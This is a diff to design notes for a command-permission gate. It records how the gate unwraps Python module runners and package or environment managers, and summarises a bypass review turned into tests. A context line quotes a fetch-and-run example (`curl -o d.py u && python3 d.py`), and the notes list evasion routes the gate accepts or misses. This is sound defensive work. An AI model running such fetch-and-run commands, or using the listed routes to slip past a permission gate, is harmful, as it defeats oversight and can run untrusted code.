@@ -297,3 +297,13 @@ decision re-run on `f433a0a`). Folded into revision 2:
   (`curl -o d.py u && python3 d.py`, `ln -s /tmp l && python3 l/s.py`): the gate resolves paths as
   they are when it checks. Friction: a cd the walk does not end (`pushd sub && popd`, `cd sub &`),
   and a script under HOME outside the project (`python3 ~/.local/x.py`).
+- T03 build: `CODE_MODULES` asks on the module's top package (`asyncio.__main__`,
+  `idlelib.pyshell` too); `python -m pip` (and `pip.__main__`) expands to `pip` through
+  `expand_runner`; `inner_launcher` reads `poetry`, `pdm`, `hatch` (and `hatch env run`, its
+  `env:` prefix and `+py=` filters), `conda`, `mamba`, `micromamba` around `run`; `inner_corepack`
+  maps the managers and their binaries (`pnpx` is `pnpm dlx`), an unknown first word stays
+  opaque; `pipx run`/`runpip`, `pixi run`/`exec`/`x` and `rye run` are opaque. Bypass review (3
+  HIGH, 3 MEDIUM, 1 LOW), each a test row. Accepted: `corepack pnpm@<url>` (the command is read,
+  its source is not; corepack refuses a URL unless `COREPACK_ENABLE_UNSAFE_CUSTOM_URLS`); pdm and
+  hatch scripts named in pyproject.toml are judged as the command word they look like; friction,
+  `conda run -nbase` (an attached value) asks.
